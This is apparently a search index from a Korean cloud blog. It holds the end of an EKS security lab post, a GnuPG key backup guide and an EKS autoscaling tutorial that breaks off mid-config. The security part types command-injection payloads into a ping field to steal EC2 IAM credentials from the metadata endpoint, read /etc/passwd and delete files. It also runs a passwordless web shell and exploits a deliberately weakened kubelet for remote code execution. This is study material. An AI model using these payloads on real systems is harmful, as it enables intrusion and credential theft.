8.8.8.8 ; curl -s -H \u0026#34;X-aws-ec2-metadata-token: {IMDSv2 토큰}\u0026#34; –v http://169.254.169.254/latest/meta-data/iam/security-credentials/ eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1H30SEASKL5M1 # EC2 Instance Profile (IAM Role) 자격증명탈취 성공 8.8.8.8 ; curl -s -H \u0026#34;X-aws-ec2-metadata-token: {IMDSv2 토큰}\u0026#34; –v http://169.254.169.254/latest/meta-data/iam/security-credentials/eksctl-myeks-nodegroup-ng1-NodeInstanceRole-1H30SEASKL5M1 # 그외 다양한 명령 실행 가능 8.8.8.8; cat /etc/passwd 8.8.8.8; rm -rf /tmp/* 5-2. 실습2: Web OpenSSH 컨테이너 HTTPS 동작이라 보안장비가 검출하기 어려움 다만, 해당 이미지는 alpine 기반에, apk repo를 main에서만 끌어올 수 있게 세팅 해당 환경에서 kubectl로 취약점 공격할 수가 없어서 curl로 host에 던져보기만 하고 종료 ## myeks-bastion-2에서 실행 # Download docker image docker pull ghostplant/webshell # 미리 접속할 주소 출력 echo -e \u0026#34;WebOpenSSH https://$(curl -s ipinfo.io/ip):8443/\u0026#34; # 새로운 쉘(옵션1) # [암호X] Run service over HTTPS, no password: docker run -it --rm --net=host -e LISTEN=\u0026#34;8443 ssl\u0026#34; ghostplant/webshell # 새로운 쉘(옵션2) # [암호O] Run service over HTTPS, with password: docker run -it --rm --net=host -e LISTEN=\u0026#34;8443 ssl\u0026#34; -e ACCOUNT=\u0026#34;admin:badmin\u0026#34; ghostplant/webshell 웹 접속 후, 정보 확인 # 정보 확인 hostname whoami ip addr mount export top 5-3. Kubelet 미흡한 인증/인가 설정 시 위험 두 개의 bastion을 번갈아가며 진행\n가장 마지막에 둔 이유: 기존 kubeconfig 소실\n실습 종료 후 cloudfomation stack 삭제 시 VPC, EIP를 중심으로 완전 삭제가 되지 않아서 일일히 웹콘솔에서 삭제해야함 [my-eks-bastion]\n# 노드의 kubelet API 인증과 인가 관련 정보 확인 ssh ec2-user@$N1 cat /etc/kubernetes/kubelet/kubelet-config.json | jq ssh ec2-user@$N1 cat /var/lib/kubelet/kubeconfig | yh # 노드의 kubelet 사용 포트 확인 ssh ec2-user@$N1 sudo ss -tnlp | grep kubelet # 데모를 위해 awscli 파드 생성 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: v1 kind: Pod metadata: name: myawscli spec: #serviceAccountName: my-sa containers: - name: my-aws-cli image: amazon/aws-cli:latest command: [\u0026#39;sleep\u0026#39;, \u0026#39;36000\u0026#39;] restartPolicy: Never EOF # 파드 사용 kubectl exec -it myawscli -- aws sts get-caller-identity --query Arn kubectl exec -it myawscli -- aws s3 ls kubectl exec -it myawscli -- aws ec2 describe-instances --region ap-northeast-2 --output table --no-cli-pager kubectl exec -it myawscli -- aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager [my-eks-bastion-2] # 기존 kubeconfig 삭제 rm -rf ~/.kube # 다운로드 curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64 \u0026amp;\u0026amp; chmod a+x ./kubeletctl_linux_amd64 \u0026amp;\u0026amp; mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl kubeletctl version kubeletctl help # 노드1 IP 변수 지정 # my-eks-bastion에 저장했던 $N1 확인하여 변수 지정 N1=192.168.1.151 # 노드1 IP로 Scan kubeletctl scan --cidr $N1/32 # 노드1에 kubelet API 호출 시도: Unauthorized curl -k https://$N1:10250/pods; echo [myeks-bastion] → 노드1 접속 : kubelet-config.json 수정 authentication.anonymous.enabled: false -\u0026gt; true authorization.mode: \u0026ldquo;Webhook\u0026rdquo; -\u0026gt; \u0026ldquo;AlwaysAllow\u0026rdquo; # 노드1 접속 ssh ec2-user@$N1 # 미흡한 인증/인가 설정으로 변경: 위의 json 수정내용 참조 vi /etc/kubernetes/kubelet/kubelet-config.json # kubelet restart systemctl restart kubelet systemctl status kubelet [myeks-bastion-2] kubelet 사용 # 파드 목록 확인 curl -s -k https://$N1:10250/pods | jq # kubelet-config.json 설정 내용 확인 curl -k https://$N1:10250/configz | jq # kubeletct 사용 # Return kubelet\u0026#39;s configuration kubeletctl -s $N1 configz | jq # Get list of pods on the node kubeletctl -s $N1 pods # Scans for nodes with opened kubelet API \u0026gt; Scans for for all the tokens in a given Node kubeletctl -s $N1 scan token # kubelet API로 명령 실행 : \u0026lt;네임스페이스\u0026gt; / \u0026lt;파드명\u0026gt; / \u0026lt;컨테이너명\u0026gt; curl -k https://$N1:10250/run/default/myawscli/my-aws-cli -d \u0026#34;cmd=aws --version\u0026#34; # remote code execution이 가능한 containers 조회 kubeletctl -s $N1 scan rce # Run commands inside a container kubeletctl -s $N1 exec \u0026#34;/bin/bash\u0026#34; -n default -p myawscli -c my-aws-cli # 내부 쉘에서 아래 실행 export aws --version aws ec2 describe-vpcs --region ap-northeast-2 --output table --no-cli-pager exit # Return resource usage metrics (such as container CPU, memory usage, etc.) kubeletctl -s $N1 metrics 6. 실습 못해본 것 파드/컨테이너 보안 컨텍스트 LB Controller IRSA 덕분에, 나중에 실습해야 함 (To-Do) ","date":"2023-06-04T06:56:52+09:00","permalink":"https://blog.minseong.xyz/post/aws-eks-study-week6/","section":"post","tags":["AWS","EKS","CloudNet@","security","IRSA"],"title":"AWS EKS 스터디 6주차 - Security"},{"categories":null,"contents":"23/05/30 GPG 키 복원방법 및 출처 추가 망가진 PC 메인보드를 교체하고, 서둘러 GPG key를 백업하였습니다.\n용량이 그리 큰편은 아니니, 왠만한 USB 메모리에도 충분히 백업이 가능합니다.\n(어째서 안했었을꼬\u0026hellip;)\n출처는 마지막 referenece를 참조해주시기 바랍니다.\n1. Backup # tree로 ~/.gnupg 확인 tree ~/.gnupg # 현재 사용중인 키 확인 gpg --list-secret-keys --keyid-format LONG # 키 백업 ## public 키 백업 gpg --export --export-options backup --output ~/public_mscho.gpg ## private 키 백업 (암호 입력 필요) gpg --export-secret-keys --export-options backup --output ~/private_mscho.gpg ## trust(신뢰관게) 백업 gpg --export-ownertrust \u0026gt; trust_mscho.gpg # 백업한 키 확인 ls -al ~/*.gpg # 백업한 키를 USB로 복사 ## 이미 마운트된 미디어 확인(볼륨이름 KEYS에 보관할 계획) tree /media ## (옵션)하위 폴더 생성 mkdir /media/KEYS/GnuPG ## 키 복사 cp ~/*.gpg /media/KEYS/GnuPG ## 복사한 키 확인 ls -al /media/kkumtree/KEYS/GnuPG/*.gpg 2. Restore 메인보드가 고장나서 패닉이 걸렸고, 일단 키부터 다른 디바이스에 복원해놓기로 했습니다. # 복원 대상의 PC에 USB를 꽂고, 해당 디렉토리로 위치 cd /media/kkumtree/KEYS/GnuPG # public 키 복원 gpg --import public_mscho.gpg # private 키 복원 (암호 입력 필요) gpg --import private_mscho.gpg # trust(신뢰관계) 복원 gpg --import-ownertrust trust_mscho.gpg # 복원된 키 확인 gpg --list-secret-keys --keyid-format LONG Reference How-To Geek ","date":"2023-05-27T18:29:18+09:00","permalink":"https://blog.minseong.xyz/post/how-to-backup-gpg-key-to-personal-media/","section":"post","tags":["GnuPG","backup"],"title":"GnuPG 키 백업하기"},{"categories":null,"contents":"이번 주차는 오토스케일링을 메인으로 하여, 수평/수직 프로비저닝을 학습해보았습니다.\n마지막에는 고성능 오토스케일러인 Karpenter를 별도로 실습해보았습니다. 특히..\nHPA custom metrics(사용자 정의 메트릭) 적용\nYAML 설정값을 CPU로 맞춘 것을 잊고, 프로비저닝을 잘못 예측한 것도 함께 공유합니다.\nAutoScaling\nHPA: Horizontal Pod Autoscaler VPA: Vertical Pod Autoscaler CA: Cluster Autoscaler 각 CSP 의존적, 워커 노드 레벨에서의 오토스케일링 1. 실습 환경 배포 4주차의 초기 배포 내용에 p8s 및 Grafana를 추가하여 배포 verticalPodAutoscaler 활성화 추천 대시보드: 15757, 17900, 15172 curl -O https://s3.ap-northeast-2.amazonaws.com/cloudformation.cloudneta.net/K8S/eks-oneclick4.yaml # 이하 중략 ## Prometheus \u0026amp; Grafana 설치 # 인증서 ARN CERT_ARN=`aws acm list-certificates --query \u0026#39;CertificateSummaryList[].CertificateArn[]\u0026#39; --output text` echo $CERT_ARN # 파라미터 파일 생성 및 배포 cat \u0026lt;\u0026lt;EOT \u0026gt; monitor-values.yaml prometheus: prometheusSpec: podMonitorSelectorNilUsesHelmValues: false serviceMonitorSelectorNilUsesHelmValues: false retention: 5d retentionSize: \u0026#34;10GiB\u0026#34; verticalPodAutoscaler: enabled: true ingress: enabled: true ingressClassName: alb hosts: - prometheus.$MyDomain paths: - /* annotations: alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/target-type: ip alb.ingress.kubernetes.io/listen-ports: \u0026#39;[{\u0026#34;HTTPS\u0026#34;:443}, {\u0026#34;HTTP\u0026#34;:80}]\u0026#39; alb.ingress.kubernetes.io/certificate-arn: $CERT_ARN alb.ingress.kubernetes.io/success-codes: 200-399 alb.ingress.kubernetes.io/load-balancer-name: myeks-ingress-alb alb.ingress.kubernetes.io/group.name: study alb.ingress.kubernetes.io/ssl-redirect: \u0026#39;443\u0026#39; grafana: defaultDashboardsTimezone: Asia/Seoul adminPassword: prom-operator ingress: enabled: true ingressClassName: alb hosts: - grafana.$MyDomain paths: - /* annotations: alb.ingress.kubernetes.io/scheme: internet-facing alb.ingress.kubernetes.io/target-type: ip alb.ingress.kubernetes.io/listen-ports: \u0026#39;[{\u0026#34;HTTPS\u0026#34;:443}, {\u0026#34;HTTP\u0026#34;:80}]\u0026#39; alb.ingress.kubernetes.io/certificate-arn: $CERT_ARN alb.ingress.kubernetes.io/success-codes: 200-399 alb.ingress.kubernetes.io/load-balancer-name: myeks-ingress-alb alb.ingress.kubernetes.io/group.name: study alb.ingress.kubernetes.io/ssl-redirect: \u0026#39;443\u0026#39; defaultRules: create: false kubeControllerManager: enabled: false kubeEtcd: enabled: false kubeScheduler: enabled: false alertmanager: enabled: false EOT kubectl create ns monitoring helm install kube-prometheus-stack prometheus-community/kube-prometheus-stack --version 45.27.2 \\ --set prometheus.prometheusSpec.scrapeInterval=\u0026#39;15s\u0026#39; --set prometheus.prometheusSpec.evaluationInterval=\u0026#39;15s\u0026#39; \\ -f monitor-values.yaml --namespace monitoring # metrics-server 배포 kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml 1-1. EKS Node Viewer 설치 파드 리소스에 대한 요청 정보를 확인할 수 있는 대시보드 해당 노드에 할당 가능한 용량을 시각적으로 표시 실제 사용량이 아니라, 요청된 리소스(CPU, Memory)에 대한 표시 실습 스책 상에서 go 설치 및 뷰어 설치시 다소 시간이 소요 (약 5분) Karpenter 실습 시에도 언급되겠지만, EKS가 구축된 뒤에 사용이 가능하다. # go 및 EKS Node Viewer 설치 yum install -y go go install github.com/awslabs/eks-node-viewer/cmd/eks-node-viewer@latest # EKS Node Viewer 실행 tree ~/go/bin cd ~/go/bin \u0026amp;\u0026amp; ./eks-node-viewer ## EKS Node Viewer 명령 샘플 # Display both CPU and Memory Usage ./eks-node-viewer --resources cpu,memory # Karenter nodes only ./eks-node-viewer --node-selector \u0026#34;karpenter.sh/provisioner-name\u0026#34; # Display extra labels, i.e. AZ ./eks-node-viewer --extra-labels topology.kubernetes.io/zone # Specify a particular AWS profile and region AWS_PROFILE=myprofile AWS_REGION=ap-northeast-2 ## 기본 옵션 환경 변수 # select only Karpenter managed nodes node-selector=karpenter.sh/provisioner-name # display both CPU and memory resources=cpu,memory 2. Horizontal Pod Autoscaler - HPA kube-ops-view 및 Grafana(17125)에서 모니터링 병행 php-apache 데모를 배포하여 진행 마지막 부하 방법으로 해도, 워커노드가 10개까지 늘어나지 않음\nHPA 조건이 CPU 50% 이기 때문에, 6~7개에서 유지됨 # CPU: 0.2코어 ~ 0.5코어(50%, 500m) 하한/상한 조건 설정 curl -s -O https://raw.githubusercontent.com/kubernetes/website/main/content/en/examples/application/php-apache.yaml kubectl apply -f php-apache.yaml # Pod 배포 후에 확인 kubectl exec -it deploy/php-apache -- cat /var/www/html/index.php # 모니터링 준비 watch -d \u0026#39;kubectl get hpa,pod;echo;kubectl top pod;echo;kubectl top node\u0026#39; kubectl exec -it deploy/php-apache -- top # 파드 특정 후 접속 테스트 PODIP=$(kubectl get pod -l run=php-apache -o jsonpath={.items[0].status.podIP}) \u0026amp;\u0026amp; curl -s $PODIP; echo ## 셋업 설정 후 부하 발생 # HPA: requests.cpu=200m kubectl autoscale deployment php-apache --cpu-percent=50 --min=1 --max=10 kubectl describe hpa # 셋업 설정 확인: CPU 사용률 50%, Replicas 범위 1~10개 kubectl krew install neat kubectl get hpa php-apache -o yaml | kubectl neat | yh # 부하 발생, 두번째 방법이 더 부하가 많이 걸림 while true;do curl -s $PODIP; sleep 0.5; done kubectl run -i --tty load-generator --rm --image=busybox:1.28 --restart=Never -- /bin/sh -c \u0026#34;while sleep 0.01; do wget -q -O- http://php-apache; done\u0026#34; # 바로 밑의 실습 이후에 관련 오브젝트 삭제 kubectl delete deploy,svc,hpa,pod --all 2-1. HPA w/ multiple \u0026amp; custom metrics 위에서 워커노드 10개까지 scale-up 되지 않았기 때문에, 추가로 메트릭을 넣고, 사용자 정의된 메트릭으로 부하 조건 충족을 목표 바로 위의 실습에서 이어서, 진행 # 위에서 정의된 HPA 오토스케일링 수정 작업을 진행 kubectl edit horizontalpodautoscaler.autoscaling 편집기에서 아래와 같이 metrics: 하위를 수정 후,\n부하를 계속 발생하면, CPU 50% 이상을 충족하지 않았어도, 워커노드가 10개까지 늘어남 describedObject: apiVersion, kind, name 을 지정하여,\n해당 오브젝트의 메트릭을 사용자 정의로 지정할 수 있음 다만, 사용자 정의 메트릭이기 때문에, eks-node-viewer에서 제대로 조건을 확인할 수 없음 # 전략 metrics: - type: Resource resource: name: cpu target: type: Utilization averageUtilization: 50 - type: Pods pods: metric: name: packets-per-second target: type: AverageValue averageValue: 1k - type: Object object: metric: name: requests-per-second describedObject: apiVersion: networking.k8s.io/v1 kind: Ingress name: main-route target: type: Value value: 10k # 후략 3. k8s based Event Driven Autoscaling - KEDA HPA, KEDA 비교\n구분 HPA KEDA resource metrics O X event driven X O metrics reference metrics-server keda-metrics-api-server scaling job O X KEDA는 HPA 대체가 아닌, 확장 보조 도구.\n실습에서는 helm 차트를 통해 설치하고, Grafana 대시보드를 통해서 확인\n그라파나 대시보드의 경우, 템플릿으로 검색되는 것은 에러가 나서, JSON을 사용 # KEDA 설치 cat \u0026lt;\u0026lt;EOT \u0026gt; keda-values.yaml metricsServer: useHostNetwork: true prometheus: metricServer: enabled: true port: 9022 portName: metrics path: /metrics serviceMonitor: # Enables ServiceMonitor creation for the Prometheus Operator enabled: true podMonitor: # Enables PodMonitor creation for the Prometheus Operator enabled: true operator: enabled: true port: 8080 serviceMonitor: # Enables ServiceMonitor creation for the Prometheus Operator enabled: true podMonitor: # Enables PodMonitor creation for the Prometheus Operator enabled: true webhooks: enabled: true port: 8080 serviceMonitor: # Enables ServiceMonitor creation for the Prometheus webhooks enabled: true EOT kubectl create namespace keda helm repo add kedacore https://kedacore.github.io/charts helm install keda kedacore/keda --version 2.10.2 --namespace keda -f keda-values.yaml # KEDA 설치 확인 kubectl get-all -n keda kubectl get all -n keda kubectl get crd | grep keda # keda 네임스페이스에 디플로이먼트 생성 kubectl apply -f php-apache.yaml -n keda kubectl get pod -n keda # ScaledObject 정책 생성 : cron cat \u0026lt;\u0026lt;EOT \u0026gt; keda-cron.yaml apiVersion: keda.sh/v1alpha1 kind: ScaledObject metadata: name: php-apache-cron-scaled spec: minReplicaCount: 0 maxReplicaCount: 2 pollingInterval: 30 cooldownPeriod: 300 scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: php-apache triggers: - type: cron metadata: timezone: Asia/Seoul start: 00,15,30,45 * * * * end: 05,20,35,50 * * * * desiredReplicas: \u0026#34;1\u0026#34; EOT kubectl apply -f keda-cron.yaml -n keda # 그라파나 대시보드 추가 후 아래 진행 # 그라파나 템플릿으로는 에러가 나서, JSON을 사용 # 모니터링 준비 watch -d \u0026#39;kubectl get ScaledObject,hpa,pod -n keda\u0026#39; kubectl get ScaledObject -w # 확인 # \u0026#34;scaledobject.keda.sh/name\u0026#34;: \u0026#34;php-apache-cron-scaled\u0026#34; 라벨 대상 이벤트 수집 kubectl get ScaledObject,hpa,pod -n keda kubectl get hpa -o jsonpath={.items[0].spec} -n keda | jq # KEDA 및 deployment 등 삭제 kubectl delete -f keda-cron.yaml -n keda \u0026amp;\u0026amp; kubectl delete deploy php-apache -n keda \u0026amp;\u0026amp; helm uninstall keda -n keda kubectl delete namespace keda 4. Vertical Pod Autoscaler - VPA 수직 스케일링: 파드의 CPU, 메모리 최적화를 통한 노드 자원 효율화 그대로 배포하면 OpenSSL CA 에러가 발생.\nOpenSSL을 1.1.1 이상으로 버전 업데이트 진행 Grafana 대시보드의 경우, 템플릿(14588, 16294)에서 에러 발생 단점: AWS 기준, 하나의 자원에 대해 ASG와 EKS에서 각각의 방식으로 관리 -\u0026gt; 관리정보가 동기화되지 않고, 스케일링 속도가 느림 # 코드 다운로드 git clone https://github.com/kubernetes/autoscaler.git cd ~/autoscaler/vertical-pod-autoscaler/ tree hack # openssl 버전 확인 openssl version # openssl 1.1.1 이상 버전 확인 yum install openssl11 -y openssl11 version # 스크립트파일내에 openssl11 수정 sed -i \u0026#39;s/openssl/openssl11/g\u0026#39; ~/autoscaler/vertical-pod-autoscaler/pkg/admission-controller/gencerts.sh # VPA 배포 watch -d kubectl get pod -n kube-system cat hack/vpa-up.sh ./hack/vpa-up.sh kubectl get crd | grep autoscaling ## 예제 ## pod 실행 수 분 뒤에 pod resource.request가 VPA에 의해 수정 # 모니터링 준비 # 모니터링 watch -d kubectl top pod # 공식 예제 배포 cd ~/autoscaler/vertical-pod-autoscaler/ cat examples/hamster.yaml | yh kubectl apply -f examples/hamster.yaml \u0026amp;\u0026amp; kubectl get vpa -w # 파드 리소스 Requests 확인 kubectl describe pod | grep Requests: -A2 # VPA에 의해 기존 파드 삭제되고 신규 파드가 생성됨 kubectl get events --sort-by=\u0026#34;.metadata.creationTimestamp\u0026#34; | grep VPA 5. Cluster Autoscaler - CA AWS CSP로 실습을 진행하므로, CA도 적용해볼 수 있음 cluster-autoscaler 파드를 배포하여 CA 동작 가능 AWS의 경우 ASG를 사용하여 CA 적용 EKS에서 기 적용된 태그 확인 k8s.io/cluster-autoscaler/enabled : \u0026rsquo;true' k8s.io/cluster-autoscaler/myeks : owned CA 동작: 주기적으로 사용률을 확인하여, 스케일 인/아웃을 수행 # EKS 노드에서 태그 확인 aws ec2 describe-instances --filters Name=tag:Name,Values=$CLUSTER_NAME-ng1-Node --query \u0026#34;Reservations[*].Instances[*].Tags[*]\u0026#34; --output yaml | yh # 현재 ASG 확인: 3 / 3 / 3 aws autoscaling describe-auto-scaling-groups \\ --query \u0026#34;AutoScalingGroups[? Tags[? (Key==\u0026#39;eks:cluster-name\u0026#39;) \u0026amp;\u0026amp; Value==\u0026#39;myeks\u0026#39;]].[AutoScalingGroupName, MinSize, MaxSize,DesiredCapacity]\u0026#34; \\ --output table # Maxsize 수정: 3 -\u0026gt; 6 export ASG_NAME=$(aws autoscaling describe-auto-scaling-groups --query \u0026#34;AutoScalingGroups[? Tags[? (Key==\u0026#39;eks:cluster-name\u0026#39;) \u0026amp;\u0026amp; Value==\u0026#39;myeks\u0026#39;]].AutoScalingGroupName\u0026#34; --output text) aws autoscaling update-auto-scaling-group --auto-scaling-group-name ${ASG_NAME} --min-size 3 --desired-capacity 3 --max-size 6 # 변경된 ASG 확인: 3 / 6 / 3 aws autoscaling describe-auto-scaling-groups --query \u0026#34;AutoScalingGroups[? Tags[? (Key==\u0026#39;eks:cluster-name\u0026#39;) \u0026amp;\u0026amp; Value==\u0026#39;myeks\u0026#39;]].[AutoScalingGroupName, MinSize, MaxSize,DesiredCapacity]\u0026#34; --output table # CA 배포 curl -s -O https://raw.githubusercontent.com/kubernetes/autoscaler/master/cluster-autoscaler/cloudprovider/aws/examples/cluster-autoscaler-autodiscover.yaml sed -i \u0026#34;s/\u0026lt;YOUR CLUSTER NAME\u0026gt;/$CLUSTER_NAME/g\u0026#34; cluster-autoscaler-autodiscover.yaml kubectl apply -f cluster-autoscaler-autodiscover.yaml # 확인 kubectl get pod -n kube-system | grep cluster-autoscaler kubectl describe deployments.apps -n kube-system cluster-autoscaler # (옵션) cluster-autoscaler 파드가 동작하는 워커 노드가 퇴출(evict) 되지 않게 설정 # 이번 실습에 적용하지 않음 kubectl -n kube-system annotate deployment.apps/cluster-autoscaler cluster-autoscaler.kubernetes.io/safe-to-evict=\u0026#34;false\u0026#34; 5-1. CA 테스트 nginx 파드 배포 후 레플리카셋 scale out 하여 확인: 1 -\u0026gt; 15 이후 노드도 자동 증가함을 확인 다시, 해당 파드를 삭제하면, scale down 됨을 확인할 수 있음 # 모니터링 준비 kubectl get nodes -w while true; do kubectl get node; echo \u0026#34;------------------------------\u0026#34; ; date ; sleep 1; done while true; do aws ec2 describe-instances --query \u0026#34;Reservations[*].Instances[*].{PrivateIPAdd:PrivateIpAddress,InstanceName:Tags[?Key==\u0026#39;Name\u0026#39;]|[0].Value,Status:State.Name}\u0026#34; --filters Name=instance-state-name,Values=running --output text ; echo \u0026#34;------------------------------\u0026#34;; date; sleep 1; done # nginx 파드 배포: 레플리카셋 1 cat \u0026lt;\u0026lt;EoF\u0026gt; nginx.yaml apiVersion: apps/v1 kind: Deployment metadata: name: nginx-to-scaleout spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: service: nginx app: nginx spec: containers: - image: nginx name: nginx-to-scaleout resources: limits: cpu: 500m memory: 512Mi requests: cpu: 500m memory: 512Mi EoF kubectl apply -f nginx.yaml kubectl get deployment/nginx-to-scaleout # 레플리카셋 15로 scale out kubectl scale --replicas=15 deployment/nginx-to-scaleout \u0026amp;\u0026amp; date # 확인 kubectl get pods -l app=nginx -o wide --watch kubectl -n kube-system logs -f deployment/cluster-autoscaler # 노드 자동 증가 확인 # 앞서 설치했던 eks-node-viewer로도 확인 kubectl get nodes aws autoscaling describe-auto-scaling-groups \\ --query \u0026#34;AutoScalingGroups[? Tags[? (Key==\u0026#39;eks:cluster-name\u0026#39;) \u0026amp;\u0026amp; Value==\u0026#39;myeks\u0026#39;]].[AutoScalingGroupName, MinSize, MaxSize,DesiredCapacity]\u0026#34; \\ --output table ./eks-node-viewer # 배포 삭제 및 (10여분 이후) 노드 갯수 축소 확인 kubectl delete -f nginx.yaml \u0026amp;\u0026amp; date watch -d kubectl get node # (옵션) 아래 flag를 통해, scale down 시간을 조정 가능 # 예시: --scale-down-delay-after-add=5m 리소스 삭제 kubectl delete -f nginx.yaml # ASG 설정 원복: 3 / 3 / 3 aws autoscaling update-auto-scaling-group --auto-scaling-group-name ${ASG_NAME} --min-size 3 --desired-capacity 3 --max-size 3 aws autoscaling describe-auto-scaling-groups --query \u0026#34;AutoScalingGroups[? Tags[? (Key==\u0026#39;eks:cluster-name\u0026#39;) \u0026amp;\u0026amp; Value==\u0026#39;myeks\u0026#39;]].[AutoScalingGroupName, MinSize, MaxSize,DesiredCapacity]\u0026#34; --output table # Cluster Autoscaler 삭제 kubectl delete -f cluster-autoscaler-autodiscover.yaml 6. Cluster Propotional Autoscaler - CPA 5와 같이 노드 수 증가에 비례하여 성능 처리가 필요한 app(컨테이너/파드)를 수평으로 자동확장 실습의 경우, nginx 사용 CPA는 CPA rule을 먼저 설정해야 함 # helm 차트를 통한 릴리즈 시도 -\u0026gt; 실패해야 정상 # (이유) CPA rule을 설정하고 helm차트를 릴리즈 필요 helm repo add cluster-proportional-autoscaler https://kubernetes-sigs.github.io/cluster-proportional-autoscaler helm upgrade --install cluster-proportional-autoscaler cluster-proportional-autoscaler/cluster-proportional-autoscaler # 먼저 nginx 배포 cat \u0026lt;\u0026lt;EOT \u0026gt; cpa-nginx.yaml apiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:latest resources: limits: cpu: \u0026#34;100m\u0026#34; memory: \u0026#34;64Mi\u0026#34; requests: cpu: \u0026#34;100m\u0026#34; memory: \u0026#34;64Mi\u0026#34; ports: - containerPort: 80 EOT kubectl apply -f cpa-nginx.yaml # CPA rule 설정 # config.ladder.nodesToReplicas: [노드수, 레플리카수] 에서 규칙 확인 cat \u0026lt;\u0026lt;EOF \u0026gt; cpa-values.yaml config: ladder: nodesToReplicas: - [1, 1] - [2, 2] - [3, 3] - [4, 3] - [5, 5] options: namespace: default target: \u0026#34;deployment/nginx-deployment\u0026#34; EOF # 모니터링 준비 watch -d kubectl get pod # helm 업그레이드 -\u0026gt; 성공 helm upgrade --install cluster-proportional-autoscaler -f cpa-values.yaml cluster-proportional-autoscaler/cluster-proportional-autoscaler # 노드 5개로 증가: rule에 따라 nginx 레플리카셋 5개 배포 export ASG_NAME=$(aws autoscaling describe-auto-scaling-groups --query \u0026#34;AutoScalingGroups[? Tags[? (Key==\u0026#39;eks:cluster-name\u0026#39;) \u0026amp;\u0026amp; Value==\u0026#39;myeks\u0026#39;]].AutoScalingGroupName\u0026#34; --output text) aws autoscaling update-auto-scaling-group --auto-scaling-group-name ${ASG_NAME} --min-size 5 --desired-capacity 5 --max-size 5 aws autoscaling describe-auto-scaling-groups --query \u0026#34;AutoScalingGroups[? Tags[? (Key==\u0026#39;eks:cluster-name\u0026#39;) \u0026amp;\u0026amp; Value==\u0026#39;myeks\u0026#39;]].[AutoScalingGroupName, MinSize, MaxSize,DesiredCapacity]\u0026#34; --output table # 노드 4개로 축소: rule에 따라 nginx 레플리카셋 3개 배포 aws autoscaling update-auto-scaling-group --auto-scaling-group-name ${ASG_NAME} --min-size 4 --desired-capacity 4 --max-size 4 aws autoscaling describe-auto-scaling-groups --query \u0026#34;AutoScalingGroups[? Tags[? (Key==\u0026#39;eks:cluster-name\u0026#39;) \u0026amp;\u0026amp; Value==\u0026#39;myeks\u0026#39;]].[AutoScalingGroupName, MinSize, MaxSize,DesiredCapacity]\u0026#34; --output table # 삭제 helm uninstall cluster-proportional-autoscaler \u0026amp;\u0026amp; kubectl delete -f cpa-nginx.yaml 7. Karpenter: k8s Native AutoScaler 단시간(n초)만에 컴퓨팅 리소스를 제공하는 노드 수명 주기 관리 솔루션 스케줄러가 unschedulable로 태깅한 pods를 포착하여 JIT(Just-In-Time)으로 노드를 생성 반대로 노드가 필요없어지면, 삭제 CA와 ASG를 둘다 거쳐야하는 방식에 비해, 더 빠르고 효율적인 리소스 제공 가능 다른 노드 그룹에서 진행하므로 앞서 진행했던 모든 EKS 실습환경을 삭제 helm uninstall -n kube-system kube-ops-view helm uninstall -n monitoring kube-prometheus-stack eksctl delete cluster --name $CLUSTER_NAME \u0026amp;\u0026amp; aws cloudformation delete-stack --stack-name $CLUSTER_NAME 새로운 환경으로 재배포: 맨 처음에 했던 실습환경 배포와 동일(cloudformation) curl -O https://s3.ap-northeast-2.amazonaws.com/cloudformation.cloudneta.net/K8S/karpenter-preconfig.yaml # 이하 생략 배포 완료 후 접속한 뒤, 확인 요소 IP 주소 확인: 172.30.0.0/16 VPC 대역에서 172.30.1.0/24 대역을 사용 eks-node-viewer 재설치 # IP 주소 확인 ip -br -c addr # eks-node-viewer 재설치 # EKS 배포 후에 실행하여 모니터링 go install github.com/awslabs/eks-node-viewer/cmd/eks-node-viewer@latest EKS 배포 및 Karpenter 프로비저너 설치 클러스터 생성 시, 20여분 소요 (차 한잔 혹은 책을 읽도록 하자) helm을 통한 Karpenter 설치 시, 환경변수 중 하나라도 확인 안되면 설치 오류가 발생 타겟 지정을 위한, Provisioner 생성 관리 대상 지정: securityGroupSelector, subnetSelector를 사용, $CLUSTER_NAME 대상 30초 이후 미사용 노드 삭제: 데몬셋 제외, 이 값을 없애면, 사용률이 낮아도 노드가 축소되지 않음! ttlSecondsAfterEmpty: 30 (참조: AWS Blog) # 환경변수 정보 확인 export | egrep \u0026#39;ACCOUNT|AWS_|CLUSTER\u0026#39; | egrep -v \u0026#39;SECRET|KEY\u0026#39; # 환경변수 설정 export KARPENTER_VERSION=v0.27.5 export TEMPOUT=$(mktemp) echo $KARPENTER_VERSION $CLUSTER_NAME $AWS_DEFAULT_REGION $AWS_ACCOUNT_ID $TEMPOUT # CloudFormation으로 IAM Policy, Role, EC2 Instance Profile 생성 curl -fsSL https://karpenter.sh/\u0026#34;${KARPENTER_VERSION}\u0026#34;/getting-started/getting-started-with-karpenter/cloudformation.yaml \u0026gt; $TEMPOUT \\ \u0026amp;\u0026amp; aws cloudformation deploy \\ --stack-name \u0026#34;Karpenter-${CLUSTER_NAME}\u0026#34; \\ --template-file \u0026#34;${TEMPOUT}\u0026#34; \\ --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \u0026#34;ClusterName=${CLUSTER_NAME}\u0026#34; # 클러스터 생성 : myeks2 EKS 클러스터 생성 eksctl create cluster -f - \u0026lt;\u0026lt;EOF --- apiVersion: eksctl.io/v1alpha5 kind: ClusterConfig metadata: name: ${CLUSTER_NAME} region: ${AWS_DEFAULT_REGION} version: \u0026#34;1.24\u0026#34; tags: karpenter.sh/discovery: ${CLUSTER_NAME} iam: withOIDC: true serviceAccounts: - metadata: name: karpenter namespace: karpenter roleName: ${CLUSTER_NAME}-karpenter attachPolicyARNs: - arn:aws:iam::${AWS_ACCOUNT_ID}:policy/KarpenterControllerPolicy-${CLUSTER_NAME} roleOnly: true iamIdentityMappings: - arn: 